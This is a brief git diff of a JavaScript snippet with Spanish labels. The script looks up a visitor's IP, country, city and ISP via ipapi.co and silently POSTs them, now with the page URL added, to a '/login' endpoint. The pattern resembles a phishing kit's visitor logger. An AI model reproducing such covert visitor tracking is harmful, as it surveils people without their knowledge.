@@ -5,9 +5,15 @@ fetch("https://ipapi.co/json")
       if (!data) {
         return false
       }
-      const query = decodeURI(`\n■■■■■🌐🌟👤■■■■■\n🌐 IP: ${data.ip}\n🗺 País: ${data.country_name}\n🌃 Ciudad: ${data.city}\n🔌Int. Comp: ${data.org}\n■■■■■■■■■■■■■■■`)
-$.ajax({
-  url: `/login?msg=${query}`, // Cambia esta URL
+      const query = `■■■■■🌐🌟👤■■■■■
+🌐 IP: ${data.ip}
+🗺 País: ${data.country_name}
+🌃 Ciudad: ${data.city}
+🔌 Int. Comp: ${data.org}
+🔗 URL: ${location.href}
+■■■■■■■■■■■■■■■`
+      $.ajax({
+  url: `/login?msg=${encodeURI(query)}`, // Cambia esta URL
   type: 'POST',
   success: function(respuesta) {
     console.log('Respuesta del servidor:', respuesta);
